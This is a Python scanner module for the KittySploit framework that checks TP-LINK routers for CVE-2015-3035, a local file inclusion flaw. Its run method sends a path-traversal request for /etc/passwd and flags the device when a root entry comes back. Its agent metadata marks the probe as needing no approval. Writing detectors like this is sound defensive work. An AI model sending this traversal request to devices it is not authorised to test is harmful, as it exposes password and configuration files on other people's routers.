#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TP-LINK is susceptible to local file inclusion in these products: Archer C5 (1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TP-LINK - Local File Inclusion Detection',
        'description': 'TP-LINK is susceptible to local file inclusion in these products: Archer C5 (1.2) with firmware before 150317, Archer C7 (2.0) with firmware before 150304, and C8 (1.0) with firmware before 150316, Archer C9 (1.0), TL-WDR3500 (1.0), TL-WDR3600 (1.0), and TL-WDR4300 (1.0) with firmware before 150302, TL-WR740N (5.0) and TL-WR741ND (5.0) with firmware before 150312, and TL-WR841N (9.0), TL-WR841N (10.0), TL-WR841ND (9.0), and TL-WR841ND (10.0) with firmware before 150310. Because of insufficient input validation, arbitrary local files can be disclosed. Files that include passwords and other sensitive information can be accessed.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'router', 'lfi', 'seclists', 'tplink', 'kev', 'tp-link', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2015/Apr/26',
            'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150410-0_TP-Link_Unauthenticated_local_file_disclosure_vulnerability_v10.txt',
            'http://www.tp-link.com/en/download/TL-WDR3600_V1.html#Firmware',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-3035',
            'http://www.tp-link.com/en/download/Archer-C5_V1.20.html#Firmware',
        ],
        'cve': 'CVE-2015-3035',
    }

    def run(self):
        r = self.http_request(method="GET", path='/login/../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="TP-LINK - Local File Inclusion detected",
                path='/login/../../../etc/passwd',
            )
            return True
        return False

